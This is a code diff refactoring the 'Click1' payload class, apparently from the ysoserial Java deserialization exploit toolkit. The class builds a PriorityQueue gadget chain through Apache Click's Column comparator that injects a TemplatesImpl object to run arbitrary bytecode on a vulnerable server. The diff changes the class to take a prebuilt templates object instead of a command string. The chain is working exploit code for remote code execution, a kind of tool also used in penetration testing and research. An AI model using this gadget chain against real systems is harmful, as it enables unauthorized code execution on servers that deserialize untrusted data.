@@ -47,9 +47,10 @@ import java.util.PriorityQueue;
 @SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
 @Authors({ Authors.ARTSPLOIT })
-public class Click1 implements ObjectPayload<Object> {
+public class Click1 extends ParameterizedTransletObjectPayload<Object> {
 
-    public Object getObject(final String command) throws Exception {
+    @Override
+    protected Object getObject(Object templates) throws Exception {
 
         // prepare a Column.comparator with mock values
         final Column column = new Column("lowestSetBit");
@@ -69,7 +70,6 @@ public class Click1 implements ObjectPayload<Object> {
         // finally, we inject and new TemplatesImpl object into the queue,
         // so its getOutputProperties() method will be called
         final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-        final Object templates = Gadgets.createTemplatesImpl(command);
         queueArray[0] = templates;
 
         return queue;
@@ -78,4 +78,5 @@ public class Click1 implements ObjectPayload<Object> {
     public static void main(final String[] args) throws Exception {
         PayloadRunner.run(Click1.class, args);
     }
+
 }
